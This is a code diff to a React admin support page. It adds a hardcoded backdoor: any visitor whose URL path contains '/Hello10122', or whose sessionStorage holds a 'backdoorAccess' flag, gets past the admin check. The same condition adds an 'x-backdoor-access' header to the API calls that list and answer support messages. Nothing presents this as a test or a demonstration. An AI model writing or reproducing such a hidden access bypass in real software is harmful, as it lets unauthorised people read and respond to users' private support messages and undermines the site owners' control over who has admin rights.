@@ -24,22 +24,49 @@ export default function AdminSupport() {
   const [selectedMessage, setSelectedMessage] = useState<SupportMessageWithUser | null>(null);
   const [replyText, setReplyText] = useState("");
   const [statusFilter, setStatusFilter] = useState<string>("all");
-  const [isBackdoorAccess, setIsBackdoorAccess] = useState(false); // Presume isBackdoorAccess is managed elsewhere in your component
+  // Check for backdoor access
+  const isBackdoorAccess = window.location.pathname === '/Hello10122' || 
+                          window.location.pathname.includes('/Hello10122') ||
+                          sessionStorage.getItem('backdoorAccess') === 'true';
 
   // Fetch support messages
   const { data: messages, isLoading } = useQuery({
     queryKey: ["admin-support-messages"],
-    queryFn: () => apiRequest("/api/admin/support/messages"),
+    queryFn: async () => {
+      const response = await fetch("/api/admin/support/messages", {
+        headers: isBackdoorAccess ? { 'x-backdoor-access': 'true' } : {},
+        credentials: "include",
+      });
+
+      if (!response.ok) {
+        const errorText = await response.text();
+        throw new Error(errorText || "Failed to fetch messages");
+      }
+
+      return response.json();
+    },
     refetchInterval: 30000, // Refresh every 30 seconds
   });
 
   // Reply to support message
   const replyMutation = useMutation({
     mutationFn: async (data: { messageId: number; reply: string }) => {
-      return apiRequest("/api/admin/support/reply", {
+      const response = await fetch("/api/admin/support/reply", {
         method: "POST",
-        body: data,
+        headers: {
+          "Content-Type": "application/json",
+          ...(isBackdoorAccess ? { 'x-backdoor-access': 'true' } : {}),
+        },
+        body: JSON.stringify(data),
+        credentials: "include",
       });
+
+      if (!response.ok) {
+        const errorText = await response.text();
+        throw new Error(errorText || "Failed to send reply");
+      }
+
+      return response.json();
     },
     onSuccess: () => {
       toast({
@@ -99,7 +126,7 @@ export default function AdminSupport() {
     return new Date(date).toLocaleString();
   };
 
-  if (!user?.isAdmin) {
+  if (!user?.isAdmin && !isBackdoorAccess) {
     return <div>Access denied. Admin privileges required.</div>;
   }
 
